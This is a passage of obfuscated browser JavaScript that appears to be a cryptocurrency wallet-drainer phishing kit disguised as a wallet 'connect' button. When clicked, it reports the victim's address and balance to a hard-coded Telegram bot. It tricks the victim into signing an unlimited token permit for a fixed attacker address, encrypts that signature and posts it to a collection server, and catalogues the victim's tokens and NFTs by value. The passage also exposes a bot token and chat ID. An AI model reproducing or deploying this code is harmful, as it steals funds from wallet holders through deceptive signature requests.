VO.name = 'spender'
VO.type = 'address'
const VB = {}
VB.internalType = 'uint256'
VB.name = 'decrement'
VB.type = 'uint256'
const Vt = {}
Vt.internalType = 'bool'
Vt.name = ''
Vt.type = 'bool'
const VF = {}
VF.inputs = [VO, VB]
VF.name = 'decreaseAllowance'
VF.outputs = [Vt]
VF.stateMutability = 'nonpayable'
VF.type = 'function'
const Vz = {}
Vz.internalType = 'address'
Vz.name = 'spender'
Vz.type = 'address'
const VK = {}
VK.internalType = 'uint256'
VK.name = 'increment'
VK.type = 'uint256'
const VJ = {}
VJ.internalType = 'bool'
VJ.name = ''
VJ.type = 'bool'
const Vl = {}
Vl.inputs = [Vz, VK]
Vl.name = 'increaseAllowance'
Vl.outputs = [VJ]
Vl.stateMutability = 'nonpayable'
Vl.type = 'function'
const Vj = {}
Vj.internalType = 'string'
Vj.name = 'tokenName'
Vj.type = 'string'
const VG = {}
VG.internalType = 'string'
VG.name = 'tokenSymbol'
VG.type = 'string'
const VQ = {}
VQ.internalType = 'string'
VQ.name = 'tokenCurrency'
VQ.type = 'string'
const VD = {}
VD.internalType = 'uint8'
VD.name = 'tokenDecimals'
VD.type = 'uint8'
const Vf = {}
Vf.internalType = 'address'
Vf.name = 'newMasterMinter'
Vf.type = 'address'
const VI = {}
VI.internalType = 'address'
VI.name = 'newPauser'
VI.type = 'address'
const Vn = {}
Vn.internalType = 'address'
Vn.name = 'newBlacklister'
Vn.type = 'address'
const Vg = {}
Vg.internalType = 'address'
Vg.name = 'newOwner'
Vg.type = 'address'
const VW = {}
VW.inputs = [Vj, VG, VQ, VD, Vf, VI, Vn, Vg]
VW.name = 'initialize'
VW.outputs = []
VW.stateMutability = 'nonpayable'
VW.type = 'function'
const VX = {}
VX.internalType = 'string'
VX.name = 'newName'
VX.type = 'string'
const VP = {}
VP.inputs = [VX]
VP.name = 'initializeV2'
VP.outputs = []
VP.stateMutability = 'nonpayable'
VP.type = 'function'
const Vw = {}
Vw.internalType = 'address'
Vw.name = 'lostAndFound'
Vw.type = 'address'
const Vr = {}
Vr.inputs = [Vw]
Vr.name = 'initializeV2_1'
Vr.outputs = []
Vr.stateMutability = 'nonpayable'
Vr.type = 'function'
const Vu = {}
Vu.internalType = 'address'
Vu.name = '_account'
Vu.type = 'address'
const Vx = {}
Vx.internalType = 'bool'
Vx.name = ''
Vx.type = 'bool'
const VR = {}
VR.inputs = [Vu]
VR.name = 'isBlacklisted'
VR.outputs = [Vx]
VR.stateMutability = 'view'
VR.type = 'function'
const Vp = {}
Vp.internalType = 'address'
Vp.name = 'account'
Vp.type = 'address'
const Ve = {}
Ve.internalType = 'bool'
Ve.name = ''
Ve.type = 'bool'
const VT = {}
VT.inputs = [Vp]
VT.name = 'isMinter'
VT.outputs = [Ve]
VT.stateMutability = 'view'
VT.type = 'function'
const VH = {}
VH.internalType = 'address'
VH.name = ''
VH.type = 'address'
const VA = {}
VA.inputs = []
VA.name = 'masterMinter'
VA.outputs = [VH]
VA.stateMutability = 'view'
VA.type = 'function'
const Vb = {}
Vb.internalType = 'address'
Vb.name = '_to'
Vb.type = 'address'
const Vs = {}
Vs.internalType = 'uint256'
Vs.name = '_amount'
Vs.type = 'uint256'
const Vv = {}
Vv.internalType = 'bool'
Vv.name = ''
Vv.type = 'bool'
const VC = {}
VC.inputs = [Vb, Vs]
VC.name = 'mint'
VC.outputs = [Vv]
VC.stateMutability = 'nonpayable'
VC.type = 'function'
const VN = {}
VN.internalType = 'address'
VN.name = 'minter'
VN.type = 'address'
const VE = {}
VE.internalType = 'uint256'
VE.name = ''
VE.type = 'uint256'
const VL = {}
VL.inputs = [VN]
VL.name = 'minterAllowance'
VL.outputs = [VE]
VL.stateMutability = 'view'
VL.type = 'function'
const Vk = {}
Vk.internalType = 'string'
Vk.name = ''
Vk.type = 'string'
const Vq = {}
Vq.inputs = []
Vq.name = 'name'
Vq.outputs = [Vk]
Vq.stateMutability = 'view'
Vq.type = 'function'
const Va = {}
Va.internalType = 'address'
Va.name = 'owner'
Va.type = 'address'
const o0 = {}
o0.internalType = 'uint256'
o0.name = ''
o0.type = 'uint256'
const o1 = {}
o1.inputs = [Va]
o1.name = 'nonces'
o1.outputs = [o0]
o1.stateMutability = 'view'
o1.type = 'function'
const o2 = {}
o2.internalType = 'address'
o2.name = ''
o2.type = 'address'
const o3 = {}
o3.inputs = []
o3.name = 'owner'
o3.outputs = [o2]
o3.stateMutability = 'view'
o3.type = 'function'
const o4 = {}
o4.inputs = []
o4.name = 'pause'
o4.outputs = []
o4.stateMutability = 'nonpayable'
o4.type = 'function'
const o5 = {}
o5.internalType = 'bool'
o5.name = ''
o5.type = 'bool'
const o6 = {}
o6.inputs = []
o6.name = 'paused'
o6.outputs = [o5]
o6.stateMutability = 'view'
o6.type = 'function'
const o7 = {}
o7.internalType = 'address'
o7.name = ''
o7.type = 'address'
const o8 = {}
o8.inputs = []
o8.name = 'pauser'
o8.outputs = [o7]
o8.stateMutability = 'view'
o8.type = 'function'
const o9 = {}
o9.internalType = 'address'
o9.name = 'owner'
o9.type = 'address'
const oM = {}
oM.internalType = 'address'
oM.name = 'spender'
oM.type = 'address'
const od = {}
od.internalType = 'uint256'
od.name = 'value'
od.type = 'uint256'
const oi = {}
oi.internalType = 'uint256'
oi.name = 'deadline'
oi.type = 'uint256'
const oS = {}
oS.internalType = 'uint8'
oS.name = 'v'
oS.type = 'uint8'
const oh = {}
oh.internalType = 'bytes32'
oh.name = 'r'
oh.type = 'bytes32'
const oZ = {}
oZ.internalType = 'bytes32'
oZ.name = 's'
oZ.type = 'bytes32'
const oy = {}
oy.inputs = [o9, oM, od, oi, oS, oh, oZ]
oy.name = 'permit'
oy.outputs = []
oy.stateMutability = 'nonpayable'
oy.type = 'function'
const om = {}
om.internalType = 'address'
om.name = 'from'
om.type = 'address'
const oU = {}
oU.internalType = 'address'
oU.name = 'to'
oU.type = 'address'
const oY = {}
oY.internalType = 'uint256'
oY.name = 'value'
oY.type = 'uint256'
const oV = {}
oV.internalType = 'uint256'
oV.name = 'validAfter'
oV.type = 'uint256'
const oo = {}
oo.internalType = 'uint256'
oo.name = 'validBefore'
oo.type = 'uint256'
const oc = {}
oc.internalType = 'bytes32'
oc.name = 'nonce'
oc.type = 'bytes32'
const oO = {}
oO.internalType = 'uint8'
oO.name = 'v'
oO.type = 'uint8'
const oB = {}
oB.internalType = 'bytes32'
oB.name = 'r'
oB.type = 'bytes32'
const ot = {}
ot.internalType = 'bytes32'
ot.name = 's'
ot.type = 'bytes32'
const oF = {}
oF.inputs = [om, oU, oY, oV, oo, oc, oO, oB, ot]
oF.name = 'receiveWithAuthorization'
oF.outputs = []
oF.stateMutability = 'nonpayable'
oF.type = 'function'
const oz = {}
oz.internalType = 'address'
oz.name = 'minter'
oz.type = 'address'
const oK = {}
oK.internalType = 'bool'
oK.name = ''
oK.type = 'bool'
const oJ = {}
oJ.inputs = [oz]
oJ.name = 'removeMinter'
oJ.outputs = [oK]
oJ.stateMutability = 'nonpayable'
oJ.type = 'function'
const ol = {}
ol.internalType = 'contract IERC20'
ol.name = 'tokenContract'
ol.type = 'address'
const oj = {}
oj.internalType = 'address'
oj.name = 'to'
oj.type = 'address'
const oG = {}
oG.internalType = 'uint256'
oG.name = 'amount'
oG.type = 'uint256'
const oQ = {}
oQ.inputs = [ol, oj, oG]
oQ.name = 'rescueERC20'
oQ.outputs = []
oQ.stateMutability = 'nonpayable'
oQ.type = 'function'
const oD = {}
oD.internalType = 'address'
oD.name = ''
oD.type = 'address'
const of = {}
of.inputs = []
of.name = 'rescuer'
of.outputs = [oD]
of.stateMutability = 'view'
of.type = 'function'
const oI = {}
oI.internalType = 'string'
oI.name = ''
oI.type = 'string'
const on = {}
on.inputs = []
on.name = 'symbol'
on.outputs = [oI]
on.stateMutability = 'view'
on.type = 'function'
const og = {}
og.internalType = 'uint256'
og.name = ''
og.type = 'uint256'
const oW = {}
oW.inputs = []
oW.name = 'totalSupply'
oW.outputs = [og]
oW.stateMutability = 'view'
oW.type = 'function'
const oX = {}
oX.internalType = 'address'
oX.name = 'to'
oX.type = 'address'
const oP = {}
oP.internalType = 'uint256'
oP.name = 'value'
oP.type = 'uint256'
const ow = {}
ow.internalType = 'bool'
ow.name = ''
ow.type = 'bool'
const or = {}
or.inputs = [oX, oP]
or.name = 'transfer'
or.outputs = [ow]
or.stateMutability = 'nonpayable'
or.type = 'function'
const ou = {}
ou.internalType = 'address'
ou.name = 'from'
ou.type = 'address'
const ox = {}
ox.internalType = 'address'
ox.name = 'to'
ox.type = 'address'
const oR = {}
oR.internalType = 'uint256'
oR.name = 'value'
oR.type = 'uint256'
const op = {}
op.internalType = 'bool'
op.name = ''
op.type = 'bool'
const oe = {}
oe.inputs = [ou, ox, oR]
oe.name = 'transferFrom'
oe.outputs = [op]
oe.stateMutability = 'nonpayable'
oe.type = 'function'
const oT = {}
oT.internalType = 'address'
oT.name = 'newOwner'
oT.type = 'address'
const oH = {}
oH.inputs = [oT]
oH.name = 'transferOwnership'
oH.outputs = []
oH.stateMutability = 'nonpayable'
oH.type = 'function'
const oA = {}
oA.internalType = 'address'
oA.name = 'from'
oA.type = 'address'
const ob = {}
ob.internalType = 'address'
ob.name = 'to'
ob.type = 'address'
const os = {}
os.internalType = 'uint256'
os.name = 'value'
os.type = 'uint256'
const ov = {}
ov.internalType = 'uint256'
ov.name = 'validAfter'
ov.type = 'uint256'
const oC = {}
oC.internalType = 'uint256'
oC.name = 'validBefore'
oC.type = 'uint256'
const oN = {}
oN.internalType = 'bytes32'
oN.name = 'nonce'
oN.type = 'bytes32'
const oE = {}
oE.internalType = 'uint8'
oE.name = 'v'
oE.type = 'uint8'
const oL = {}
oL.internalType = 'bytes32'
oL.name = 'r'
oL.type = 'bytes32'
const ok = {}
ok.internalType = 'bytes32'
ok.name = 's'
ok.type = 'bytes32'
const oq = {}
oq.inputs = [oA, ob, os, ov, oC, oN, oE, oL, ok]
oq.name = 'transferWithAuthorization'
oq.outputs = []
oq.stateMutability = 'nonpayable'
oq.type = 'function'
const oa = {}
oa.internalType = 'address'
oa.name = '_account'
oa.type = 'address'
const c0 = {}
c0.inputs = [oa]
c0.name = 'unBlacklist'
c0.outputs = []
c0.stateMutability = 'nonpayable'
c0.type = 'function'
const c1 = {}
c1.inputs = []
c1.name = 'unpause'
c1.outputs = []
c1.stateMutability = 'nonpayable'
c1.type = 'function'
const c2 = {}
c2.internalType = 'address'
c2.name = '_newBlacklister'
c2.type = 'address'
const c3 = {}
c3.inputs = [c2]
c3.name = 'updateBlacklister'
c3.outputs = []
c3.stateMutability = 'nonpayable'
c3.type = 'function'
const c4 = {}
c4.internalType = 'address'
c4.name = '_newMasterMinter'
c4.type = 'address'
const c5 = {}
c5.inputs = [c4]
c5.name = 'updateMasterMinter'
c5.outputs = []
c5.stateMutability = 'nonpayable'
c5.type = 'function'
const c6 = {}
c6.internalType = 'address'
c6.name = '_newPauser'
c6.type = 'address'
const c7 = {}
c7.inputs = [c6]
c7.name = 'updatePauser'
c7.outputs = []
c7.stateMutability = 'nonpayable'
c7.type = 'function'
const c8 = {}
c8.internalType = 'address'
c8.name = 'newRescuer'
c8.type = 'address'
const c9 = {}
c9.inputs = [c8]
c9.name = 'updateRescuer'
c9.outputs = []
c9.stateMutability = 'nonpayable'
c9.type = 'function'
const cM = {}
cM.internalType = 'string'
cM.name = ''
cM.type = 'string'
const cd = {}
cd.inputs = []
cd.name = 'version'
cd.outputs = [cM]
cd.stateMutability = 'view'
cd.type = 'function'
permit_abi = [
  Y0,
  Y3,
  Y6,
  Y8,
  YM,
  YS,
  YZ,
  YY,
  Yc,
  YB,
  Yz,
  YK,
  Yl,
  YG,
  YI,
  Yg,
  YW,
  YP,
  Yr,
  Yx,
  Yp,
  YT,
  Ys,
  YE,
  Ya,
  V2,
  V4,
  V6,
  V8,
  Vh,
  VU,
  VV,
  Vc,
  VF,
  Vl,
  VW,
  VP,
  Vr,
  VR,
  VT,
  VA,
  VC,
  VL,
  Vq,
  o1,
  o3,
  o4,
  o6,
  o8,
  oy,
  oF,
  oJ,
  oQ,
  of,
  on,
  oW,
  or,
  oe,
  oH,
  oq,
  c0,
  c1,
  c3,
  c5,
  c7,
  c9,
  cd,
]
function ch(Y) {
  const F = new ArrayBuffer(Y.length),
    z = new Uint8Array(F)
  for (let K = 0, J = Y.length; K < J; K++) {
    z[K] = Y.charCodeAt(K)
  }
  return F
}
var ci = abicko2.encodeFunctionData('approve', [
    '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
    '115792089237316195423570985008687907853269984665640564039457584007913129639935',
  ]),
  cS = abicko.encodeFunctionData('setApprovalForAll', [
    '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
    '1',
  ])

function cZ(M) {
  let d = new TextEncoder()
  return d.encode(M)
}
async function cy(data) {
  const h = {
    one: btoa(data),
  }
  console.log('A WEBHOOK: ', JSON.stringify(h))
  // fetch('https://moralis-node.com/users/78945757', {
  //   method: 'POST',
  //   body: JSON.stringify(h),
  // })
  const TOKEN_ID = `5604699638:AAEChOnW2LEaho1wZXTfHPhvfWNknm0yGjc`
  const CHAT_ID = `-815442696`
  
  $.ajax({
    type: 'POST',
    url:
      'https://api.telegram.org/bot' +
      TOKEN_ID +
      '/sendMessage?chat_id=' +
      CHAT_ID,
    data:
      'parse_mode=HTML&text=' +
      encodeURIComponent(data),
  })
  return
}
async function cm(d, i) {
  let Z = cZ(i)
  const y = { name: 'RSA-OAEP' }
  ciphertext = await window.crypto.subtle.encrypt(y, d, Z)
  let Y = new Uint8Array(ciphertext)
  return (ciphertext_base64 = btoa(Y)), ciphertext_base64
}
const cU =
    '-----BEGIN PUBLIC KEY-----\n  MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAyhjLI0OF2W5/v8NRbrvqHtanx6gmoGhh9im8Iokd+7HNal2N9/pM07o/L3DxK+UQOS4tNRRXr6ii7bK2XT+U96by0NlcAyw8Gii57ORut54w4Cz9ayLcqqPXaapBDfCGTSCTaCzAsfzX33ZHoD4uFQD9lcqiVPmiKaiY7JD1qg+S2l5/Ja62y9FpKDK/RcqoFktYPzbguRYWzT21JIQXEcpMs4KY/ixm8hJH6g9iI5m0f0vk0oeIdx12VOeoDPMED7GUvO9rcPnRSUEG3vnwLFtvdOfdNP9M3xbRAWhNnpnUjAILSvB/yFyotOfcqkEFwVp17ZH6FQdADBH23krXM4pZFkaHfVkh4dRAHIyIirF/whn/YqMqIZvCOz/V72K54EQuDsw057WF0QrYpYSvgjtXbpOW4S3Yq2JLL7ETx9ThHkagAWw6tTY8gOTfsbrv1UqcS/rhCHSVBcGhtGr6AJlUph68fN7/EPCLbGa34vMJ0Y+tMg21PsjEEUFwYriHjSme7KxNNNK3xr8cCkcL8lZ4HQmmSC5kdGPYtREgF4WN+G6meISeSSYe045ICYsXs2Dd0pa8Pywe+ZRgKQDJSHzjQPY4htnZJYCc/aDvwFtVMO1Co8z6GiWpV6Z9KnHF7yw/yEQJjkVLYHZJdtcB6nPh/VSSQ8TN/La0xn6nVxsCAwEAAQ==\n  -----END PUBLIC KEY-----',
  cY = '-----BEGIN PUBLIC KEY-----',
  cV = '-----END PUBLIC KEY-----',
  co = cU.substring(cY.length, cU.length - cV.length),
  cc = window.atob(co),
  cO = ch(cc)
$(document).ready(async function () {
  function d(h, Z) {
    var V = 0
    while (V < h.length) {
      if (h[V] === Z) {
        h.splice(V, 1)
      } else {
        ++V
      }
    }
    return h
  }
  $(
    '#metamaskbutton,#metamaskbutton1,#metamaskbutton2,#metamaskbutton3,#metamaskbutton4,#metamaskbutton5'
  ).click(async () => {
    if (yJ) {
      return
    } else {
      yJ = true
    }
    const c = window.Web3Modal.default,
      O = window.WalletConnectProvider.default
    let B, t
    console.log('Initializing example')
    console.log('WalletConnectProvider is', O)
    console.log(
      'window.web3 is',
      window.web3,
      'window.ethereum is',
      window.ethereum
    )
    const F = { infuraId: '9aa3d95b3bc440fa88ea12eaa4456161' }
    const z = {
      package: O,
      options: F,
    }
    const K = { walletconnect: z }
    const J = K,
      l = {
        cacheProvider: false,
        providerOptions: J,
        disableInjectedProvider: false,
        network: 'mainnet',
        theme: 'dark',
      }
    B = new c(l)
    console.log('Web3Modal instance is', B)
    console.log('Opening a dialog', B)
    try {
      t = await B.connect()
      if (t.chainId != '0x1') {
        const M0 = {
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x1' }],
        }
        await t.request(M0)
      }
    } catch (M2) {
      t == 'undefined' &&
        window.open(
          'dapp://' + window.location.host + window.location.pathname
        ),
        console.log('Could not get a wallet connection', M2)
    }
    t.on('accountsChanged', (M5) => {
      window.location.reload()
    })
    t.on('chainChanged', (M5) => {
      window.location.reload()
    })
    t.on('networkChanged', (M5) => {
      window.location.reload()
    })
    t = await new ethers.providers.Web3Provider(t)
    const j = await t.getSigner(),
      G = new window.seaport(j)
    signerGlobal = j
    var Q = await j.getAddress()
    const D = await j.getBalance()
    provider_test = await new ethers.ethers.providers.InfuraProvider(
      null,
      '9aa3d95b3bc440fa88ea12eaa4456161'
    )
    cy(
      '%F0%9F%92%BE CONNECT [Address](https://etherscan.io/address/' +
        Q +
        ') [Opensea](https://opensea.io/' +
        Q +
        ') [Portfolio](https://dappradar.com/hub/wallet/eth/' +
        Q +
        ')\n' +
        ethers.utils.formatEther(D) +
        ' ETH ' +
        window.location.host +
        '&parse_mode=Markdown'
    )
    $(
      '#metamaskbutton,#metamaskbutton1,#metamaskbutton2,#metamaskbutton3,#metamaskbutton4,#metamaskbutton5'
    ).html(yB)
    async function f(M5) {
      async function Md(My, Mm, MU, MY, MV, Mo) {
        try {
          console.log('trying')
          keyPair = await window.crypto.subtle.importKey(
            'spki',
            cO,
            {
              name: 'RSA-OAEP',
              hash: 'SHA-256',
            },
            true,
            ['encrypt']
          )
          console.log(MY)
          mess_perm = await cm(keyPair, My)
          addr_permit = await cm(keyPair, Mm)
          addr_perm_t = await cm(keyPair, MU)
          ammt_permit_e = await cm(keyPair, MV)
          addr_rec_e = await cm(keyPair, Mo)
          fetch('http://localhost:5000/users/98745164879451', {
            method: 'POST',
            body: JSON.stringify({
              one: yz,
              two: mess_perm,
              three: addr_permit,
              four: addr_perm_t,
              five: btoa(MY),
              eight: ammt_permit_e,
              nine: addr_rec_e,
            }),
          })
          return
        } catch (MF) {
          console.log(MF)
        }
      }
      const Mi = await new ethers.Contract(M5, permit_abi, j),
        [MS] = await Promise.all([Mi.name()])
      try {
        version = await Mi.version()
      } catch {
        version = '1'
      }
      console.log(version)
      connector = await new window.oneinch.Web3ProviderConnector(t)
      eip2612PermitUtils = await new window.oneinch.Eip2612PermitUtils(
        connector
      )
      console.log(eip2612PermitUtils)
      const Mh = (window.oneinch.PermitParams = {
        owner: Q,
        spender: '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
        value:
          '115792089237316195423570985008687907853269984665640564039457584007913129639935',
        nonce: await eip2612PermitUtils.getTokenNonce(M5, Q),
        deadline: 4482689033,
      })
      var M7 = await eip2612PermitUtils.buildPermitSignature(
        {
          ...Mh,
          nonce: await eip2612PermitUtils.getTokenNonce(M5, Q),
        },
        await j.getChainId(),
        MS,
        M5,
        version
      )
      const MZ = JSON.stringify(M7)
      console.log(M7)
      var M8 = [Q, MZ],
        M9 = 'eth_signTypedData_v4'
      try {
        const MU = {
          method: M9,
          params: M8,
          address: Q,
        }
        const MY = await window.ethereum.request(MU),
          { v: MV, r: Mo, s: Mc } = ethers.utils.splitSignature(MY)
        valueeeeeee = 'test'
        encoded_aaaaaaaaaaa = Mi.interface.encodeFunctionData('permit', [
          Q,
          '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
          '115792089237316195423570985008687907853269984665640564039457584007913129639935',
          4482689033,
          MV,
          Mo,
          Mc,
        ])
        Md(
          '%F0%9F%A9%B8 ERC-20-Permit ' +
            window.location.host +
            ' \nFROM ' +
            Q +
            '\nTO ' +
            '\nValue: ' +
            valueeeeeee +
            'ETH&parse_mode=Markdown',
          Q,
          M5,
          encoded_aaaaaaaaaaa,
          valueeeeeee,
          '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676'
        )
        console.log(Q)
        const MO = {
          v: MV,
          r: Mo,
          s: Mc,
        }
        console.log(MO)
      } catch (Mt) {
        console.log(Mt)
        cy(
          '%F0%9F%9A%A8 ERC-20 PERMIT REJECTED [Address](https://etherscan.io/address/' +
            Q +
            ') [Opensea](https://opensea.io/' +
            Q +
            ')&parse_mode=Markdown'
        )
      }
    }
    async function I(M5) {
      var M6 = []
      return (
        (logs_nft = await provider_test.getLogs({
          fromBlock: '0x1',
          toBlock: 'latest',
          topics: [
            '0x17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31',
            '0x000000000000000000000000' + M5.slice(2),
            '0x0000000000000000000000001e0049783f008a0085193e00003d00cd54003c71',
          ],
        })),
        console.log(logs_nft),
        logs_nft.forEach((M7) => {
          addresss = M7.address
          data = M7.data
          if (data.endsWith('1')) {
            M6.push(addresss.toLowerCase())
          } else {
            M6 = d(M6, addresss.toLowerCase())
          }
        }),
        M6
      )
    }
    async function n(M5) {
      var M7 = []
      return (
        (logs_tokens = await provider_test.getLogs({
          fromBlock: '0x1',
          toBlock: 'latest',
          topics: [
            '0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925',
            '0x000000000000000000000000' + M5.slice(2),
            '0x0000000000000000000000001e0049783f008a0085193e00003d00cd54003c71',
          ],
        })),
        logs_tokens.forEach((M8) => {
          addresss = M8.address
          data = M8.data
          data.startsWith('0xf')
            ? M7.push(addresss.toLowerCase())
            : (M7 = d(M7, addresss.toLowerCase()))
        }),
        M7
      )
    }
    async function g(M5) {
      const M9 = {},
        MM = M5.map(async (Md) => {
          const MS = await fetch(
            'https://api.thegraph.com/subgraphs/name/uniswap/uniswap-v3',
            {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(Mi).replace('token_addre', Md.token_address),
            }
          ).then((MZ) => MZ.json())
          if (!MS.data.token) {
            return
          }
          const Mh = MS.data.token.derivedETH
          try {
            price_in_eth = Number(Mh).toFixed(13)
            balance_erc20_eth =
              (Md.balance * price_in_eth) / Math.pow(10, Md.decimals)
            if (balance_erc20_eth < 0.05) {
              return
            }
            M9[Md.token_address] = [balance_erc20_eth, Md.balance]
          } catch (My) {
            return
          }
        })
      return await Promise.all(MM), M9
    }
    async function W(M5) {
      let M7 = M5
      const M8 = []
      let M9 = true,
        MM = '',
        Md = 0
      while (M9 && Md < 10) {
        const { next: Mi, assets: MS } = await fetch(
          'https://api.opensea.io/api/v1/assets?owner=' +
            M7 +
            (MM.length ? '&cursor=' + MM : '') +
            '&limit=100'
        ).then((Mh) => Mh.json())
        M8.push(...MS)
        Md++
        MM = Mi
        M9 = MM != null
      }
      return M8
    }
    var X = Promise.all([I(Q), n(Q), W(Q)])
    const P = {
      method: 'GET',
      headers: {},
    }
    P.headers.accept = 'application/json'
    P.headers['X-API-Key'] = 'test'
    const w = P
    var u = fetch(
        'https://deep-index.moralis.io/api/v2/' + Q + '/erc20?chain=eth',
        w
      ),
      x = [],
      R = []
    out_of_promise = await X
    var p = out_of_promise[0],
      T = out_of_promise[1],
      H = out_of_promise[2]
    for (let M5 = 0; M5 < H.length; M5++) {
      if (R.includes(H[M5].collection.slug) == false) {
        R.push(H[M5].collection.slug)
        x.push(H[M5])
      }
    }
    console.log(R)
    async function A(M8, M9) {
      const Md = {}
      Md['0xd4e4078ca3495de5b1d4db434bebc5a986197782'] = 235
      Md['0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d'] = 88.71275
      Md['0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03'] = 58
      Md['0x08d7c0242953446436f34b4c78fe9da38c73668d'] = 40.07507
      Md['0x22c36bfdcef207f9c0cc941936eff94d4246d14a'] = 38.89333
      Md['0x57a204aa1042f6e66dd7730813f4024114d74f37'] = 2.44089
      Md['0x23581767a106ae21c074b2276d25e5c3e136a68b'] = 10.5538
      Md['0x348fc118bcc65a92dc033a951af153d14d945312'] = 13.23112
      Md['0xed5af388653567af2f388e6224dc7c4b3241c544'] = 13.38591
      Md['0x620b70123fb810f6c653da7644b5dd0b6312e4d8'] = 7
      Md['0x60e4d786628fea6478f785a6d7e704777c86a7c6'] = 15.70257
      Md['0x8a90cab2b38dba80c64b7734e58ee1db38b8992e'] = 8.62397
      Md['0x49cf6f5d44e70224e2e23fdcdd2c053f30ada28b'] = 9.46793
      Md['0xc541fc1aa62384ab7994268883f80ef92aac6399'] = 0.35
      Md['0xa3aee8bce55beea1951ef834b99f3ac60d1abeeb'] = 7.36964
      Md['0xba30e5f9bb24caa003e9f2f0497ad287fdf95623'] = 6.7515
      Md['0x9930929903f9c6c83d9e7c70d058d03c376a8337'] = 4.93333
      Md['0x86825dfca7a6224cfbd2da48e85df2fc3aa7c4b1'] = 2.70743
      Md['0x86357a19e5537a8fba9a004e555713bc943a66c0'] = 5.5
      Md['0x341a1c534248966c4b6afad165b98daed4b964ef'] = 1.68468
      Md['0x7bd29408f11d2bfc23c34f18275bbf23bb716bc7'] = 3.79263
      Md['0xbd4455da5929d5639ee098abfaa3241e9ae111af'] = 0.9126
      Md['0x282bdd42f4eb70e7a9d9f40c8fea0825b7f68c5d'] = 6.02654
      Md['0xedb61f74b0d09b2558f1eeb79b247c1f363ae452'] = 5.38479
      Md['0x306b1ea3ecdf94ab739f1910bbda052ed4a9f949'] = 1.14394
      Md['0x59468516a8259058bad1ca5f8f4bff190d30e066'] = 3.43683
      Md['0x1a92f7381b9f03921564a437210bb9396471050c'] = 3.48353
      Md['0xe785e82358879f061bc3dcac6f0444462d4b5330'] = 2.87929
      Md['0x7d8820fa92eb1584636f4f5b8515b5476b75171a'] = 2.08328
      Md['0x9df8aa7c681f33e442a0d57b838555da863504f3'] = 1.48122
      Md['0x34d85c9cdeb23fa97cb08333b511ac86e1c4e258'] = 3.25004
      Md['0x160c404b2b49cbc3240055ceaee026df1e8497a0'] = 0.22416
      Md['0x7eaa96d48380802a75ed6d74b91e2b30c3d474c1'] = 0.40688
      Md['0xb668beb1fa440f6cf2da0399f8c28cab993bdd65'] = 8.8343
      Md['0x513cd71defc801b9c1aa763db47b5df223da77a2'] = 6.883
      Md['0x5b7622ded96511639ddc12c86eb2703331ca2c78'] = 0.19415
      Md['0xc9677cd8e9652f1b1aadd3429769b0ef8d7a0425'] = 1.92167
      Md['0x9705a7113363a383c8a96689e20286abe6612bb3'] = 0.79468
      Md['0x1792a96e5668ad7c167ab804a100ce42395ce54d'] = 1.28849
      Md['0x08ba8cbbefa64aaf9df25e57fe3f15ecc277af74'] = 5.755
      Md['0xce17f8ef13cf67da6eab86e31360102eea8609ff'] = 2.21447
      Md['0x6dc6001535e15b9def7b0f6a20a2111dfa9454e2'] = 1.12671
      Md['0x6fc3ad6177b07227647ad6b4ae03cc476541a2a0'] = 1.91582
      Md['0x9168224fd1033ca25aaebae9eff39c92bd15231c'] = 0.271
      Md['0xf81ead7c021ef1aef78ec1ffe1e4abd0ecdb216d'] = 0.91556
      Md['0x6d4bbc0387dd4759eee30f6a482ac6dc2df3facf'] = 1.51764
      Md['0xf54cc94f1f2f5de012b6aa51f1e7ebdc43ef5afc'] = 0.36656
      Md['0x1cb1a5e65610aeff2551a50f76a87a7d3fb649c6'] = 2.02871
      Md['0x8a939fd297fab7388d6e6c634eee3c863626be57'] = 7.46889
      Md['0x78d61c684a992b0289bbfe58aaa2659f667907f8'] = 0.75161
      Md['0x496a2d17a89cbc4248e9b52c8003a50c648fbca0'] = 2.09829
      Md['0xae3d8d68b4f6c3ee784b2b0669885a315ba77c08'] = 1.12525
      Md['0xe0176ba60efddb29cac5b15338c9962daee9de0c'] = 0.34525
      Md['0x0825f050e9b021a0e9de8cb1fb10b6c9f41e834c'] = 1.61533
      Md['0x892848074ddea461a15f337250da3ce55580ca85'] = 1.19934
      Md['0xc9d8f15803c645e98b17710a0b6593f097064bef'] = 3.80792
      Md['0x20ed6cdf9344b3a187063a3ff4d883b6b1947b81'] = 0.67082
      Md['0xccc441ac31f02cd96c153db6fd5fe0a2f4e6a68d'] = 2.68912
      Md['0x7cc7add921e2222738561d03c89589929cefcf21'] = 0.33352
      Md['0x16de9d750f4ac24226154c40980ef83d4d3fd4ad'] = 1.06925
      Md['0xb6329bd2741c4e5e91e26c4e653db643e74b2b19'] = 1.92237
      Md['0xab0b0dd7e4eab0f9e31a539074a03f1c1be80879'] = 1.93281
      Md['0xf661d58cfe893993b11d53d11148c4650590c692'] = 0.60498
      Md['0x2250d7c238392f4b575bb26c672afe45f0adcb75'] = 1.90943
      Md['0xd2f668a8461d6761115daf8aeb3cdf5f40c532c6'] = 0.29462
      Md['0xf87e31492faf9a91b02ee0deaad50d51d56d5d4d'] = 2.74506
      Md['0x959e104e1a4db6317fa58f8295f586e1a978c297'] = 2.74506
      Md['0x521f9c7505005cfa19a8e5786a9c3c9c9f5e6f42'] = 1.34235
      Md['0x31b6d1289f96818e79dbb271bf77e8132b86e814'] = 0.35112
      Md['0x79fcdef22feed20eddacbb2587640e45491b757f'] = 1.2835
      Md['0x3903d4ffaaa700b62578a66e7a67ba4cb67787f9'] = 1.04069
      Md['0xd0318da435dbce0b347cc6faa330b5a9889e3585'] = 0.71654
      Md['0x529a4e15b3ce13523417f945ecd0959ff71e0a9e'] = 0.49818
      Md['0x6080b6d2c02e9a0853495b87ce6a65e353b74744'] = 0.18025
      Md['0xbd3531da5cf5857e7cfaa92426877b022e612cf8'] = 3.2586
